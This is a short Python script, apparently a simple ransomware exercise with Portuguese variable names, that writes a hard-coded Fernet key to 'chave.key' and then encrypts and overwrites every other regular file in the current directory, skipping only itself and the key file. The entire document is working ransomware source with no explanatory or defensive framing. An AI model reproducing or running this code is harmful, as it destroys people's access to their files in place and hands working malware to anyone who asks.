import os
from cryptography.fernet import Fernet

files = []

with open("chave.key", "wb") as chave:
    chave.write(b'cVtuscbrP0bE38XW6S48hDb0Q9v6NOdrg6JA5EKzcGY=')

for file in os.listdir():
    if file =="ransomware.py" or file == "chave.key":  
        continue
    if os.path.isfile(file):
        files.append(file)
 
for file in files:
    with open(file, "rb") as arquivo:
        conteudo = arquivo.read()
    conteudo_encrypted = Fernet(b'cVtuscbrP0bE38XW6S48hDb0Q9v6NOdrg6JA5EKzcGY=').encrypt(conteudo)
    with open(file, "wb") as arquivo:
        arquivo.write(conteudo_encrypted)
